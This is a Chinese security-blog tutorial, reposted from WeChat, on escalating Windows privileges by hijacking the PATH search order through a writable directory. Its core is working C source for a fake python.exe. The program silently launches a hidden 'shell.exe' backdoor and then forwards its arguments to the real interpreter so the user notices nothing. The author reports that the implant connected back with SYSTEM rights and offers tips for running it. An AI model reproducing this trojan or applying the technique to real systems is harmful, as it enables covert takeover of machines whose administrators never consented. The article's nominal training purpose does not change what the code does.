> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gTEYKIiSZahU9gF3SDinKw)

获网安教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

本文由掌控安全学院 - camer 投稿

**0x01 前提**
===========

通过滥用系统的路径搜索机制来欺骗高权限用户执行看似合法的系统二进制文件，实际上是恶意的代码或程序，从而导致升权限并执行恶意操作。

攻击的关键前提：

1.  路径搜索顺序： 当用户在命令行或程序中执行一个命令时，系统会在环境变量 $PATH 定义的路径列表中搜索要执行的程序。它将从列表中的第一个路径开始搜索，然后按顺序继续搜索，直到找到匹配的程序。
    
2.  权限限制： 用户权限的差异是这种攻击的基础。攻击者通常需要两类用户：
    

*   低权限用户（M）： 拥有较低权限，只能访问和写入特定文件夹，例如 c:\temp。
    
*   高权限用户： 拥有系统管理员或其他高权限角色，能够执行敏感的系统命令和操作。
    

4.  环境变量设置： 攻击者需要控制或能够修改低权限用户（M）的环境变量设置，尤其是 $PATH 变量。
    

**0x02 原理分析**
=============

原理是利用操作系统环境变量设置的弱点来欺骗高权限用户执行恶意代码，从而实现权限提升。

正常情况系统的环境变量是从`c:\Windows\system32`开始遍历，如下所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrjX1j2PickquX5tJvEn3SdibBQJr0XVAD8HR3ib6aicEibCThSOAgYcOTS61a5icoSpibsnuicHGScpEWslw/640?wx_fmt=png)

但是，当存在于环境变量的路径在`c:\Windows\system32`之前，并且可由低权限用户 (M) 修改的时候，就会造成环境变量的滥用，例如（`c:\Windows\temp`变量路径滥用）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrjX1j2PickquX5tJvEn3Sdib2MiccM2PwU2AZPhECCk396ZyvhCy7wNIzW0ezusONfXDjsHZ0Uyev0g/640?wx_fmt=png)

并且查看文件夹访问权限，是可以用户修改的，查询如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrjX1j2PickquX5tJvEn3SdibdV1p4RkibKE1SB7HmtCYCs2ichAcMfo4aXXeTxQDTibmenIMDNJ4qvCcw/640?wx_fmt=png)

*   `BUILTIN\Users`：内置的用户组 “Users” 有以下权限：(CI)：容器内项目，(S)：同步访问，(WD)：写入数据，(AD)：添加数据，(X)：执行文件。这意味着”Users” 组可以读取、写入、添加、执行该文件夹内的项目。
    
*   `BUILTIN\Administrators`：内置的管理员组 “Administrators” 有：(F)：完全控制权限。这意味着管理员可以完全控制该文件夹，包括修改权限。
    
*   `NT AUTHORITY\SYSTEM`：系统账户有：(F)：完全控制权限。这允许系统账户对文件夹拥有完全控制。
    
*   `CREATOR OWNER`：文件或文件夹的创建者有：(OI)(CI)(IO)(F)：对象的所有权，容器和继承的所有权，对象的访问权限，完全控制权限。这使得文件或文件夹的创建者拥有完全控制权限。
    
*   `SAEDYQJKFJNNOFS\camer`：用户”camer” 有：(OI)(CI)(F)：对象的所有权，容器和继承的所有权，完全控制权限。
    

当用户将恶意程序放在`c:\Windows\temp`目录下的时候，正常用户无论是 Administrator 还是 SYSTEM 调用，都会优先执行恶意程序，例如劫持的是 cmd.exe，如下会被劫持执行计算器，如下所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrjX1j2PickquX5tJvEn3Sdib8bnUK5rBFTVFMiauM1tETCPgWlgSlWgxn9dblr32HYYGgRoEKJWseMQ/640?wx_fmt=png)

**0x03 利用思路**
=============

实际利用的时候还存在一个巨大的缺陷，就是系统核心命令使用了一个称为 “系统目录优先级” 的机制，即使你在环境变量中指定了其他目录，系统仍然会首先搜索系统目录（通常是 C:\Windows\system32）中的可执行文件，以确保系统的稳定性和安全性。

所以说只能接劫持利用 python、java、gcc 等用户环境的环境变量滥用，才能实际利用。

恶意程序如下（劫持的 python.exe）：

```
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
      // 恶意程序
    wchar_t* Shell = L"C:\\Windows\\Temp\\shell.exe";

    HINSTANCE hInstance1 = ShellExecuteW(NULL, L"open", Shell, NULL, NULL, SW_HIDE);

      // 保证python程序能够正常执行
    if (argc >= 2) {
        const char* pythonPath = "C:\\Users\\camer\\AppData\\Local\\Programs\\Python\\Python39\\python.exe";

        // 构建调用Python脚本的命令
        char pythonCommand[4096]; // Increased buffer size to accommodate more arguments
        snprintf(pythonCommand, sizeof(pythonCommand), "%s %s", pythonPath, argv[1]);

        // 将额外的参数添加到 Python 命令中
        for (int i = 2; i < argc; ++i) {
            strcat(pythonCommand, " ");
            strcat(pythonCommand, argv[i]);
        }
        // 调用Python脚本
        system(pythonCommand);
    }
    return 0;
}


```

假设用户要使用管理员权限执行 python 文件，调用 python 执行命令（python 文件随便让 GPT 生成的）：

```
python 1.py greeting morning


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrjX1j2PickquX5tJvEn3Sdibs8j0nYJFSyugGic02fGSjJjiatxs9lfxlbNzVH3NcMLntQQPsXk15qJg/640?wx_fmt=png)

执行成功会发现正常运行输出，但是实际后台执行恶意程序并上线成功，并且具有 SYSTEM 权限的，如下所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrjX1j2PickquX5tJvEn3SdibjY4rrHfE3knHgaUeecRHTXJhl55fRnbiaHked6iaZZMYe1G9gicHgVDcQ/640?wx_fmt=png)

**0x04 思考总结**

普通用户权限调用 python 也会上线，并且最好 shell 添加防止进程多开的功能，不然后台容易都是马。

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)  

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程 + 工具 + 交流群 + 靶场账号**哦

![](https://mmbiz.qpic.cn/mmbiz_jpg/BwqHlJ29vcoIcwBdwfRjuhUCEKW2V1AllXYDcxqn7dd0sYo2bY045P5ib2tsIY2u1dRc9nqCFpOJQNGIYnqia0fw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

 **分享后扫码加我！**

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器 cs4.0 使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC 快速入门 + 上分小秘籍 + 实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

点赞 + 在看支持一下吧~ 感谢看官老爷~ 

你的点赞是我更新的动力